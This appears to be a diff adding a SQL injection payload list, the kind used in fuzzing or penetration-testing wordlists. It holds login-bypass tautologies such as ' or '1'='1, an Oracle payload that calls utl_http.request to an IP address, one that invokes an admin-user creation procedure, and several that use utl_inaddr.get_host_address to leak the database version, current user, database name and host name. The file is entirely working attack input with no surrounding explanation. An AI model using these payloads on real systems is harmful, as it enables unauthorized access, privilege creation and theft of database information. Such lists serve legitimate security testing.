@@ -1,0 +1,15 @@
+' or 2=2
+' or 1=1
+or 2=2
+2=2
+or 1=1
+" or 2=2
+’ or ‘1’=’1
+' or '1'='1
+'||utl_http.request('httP://192.168.1.1/')||'
+' || myappadmin.adduser('admin', 'newpass') || '
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
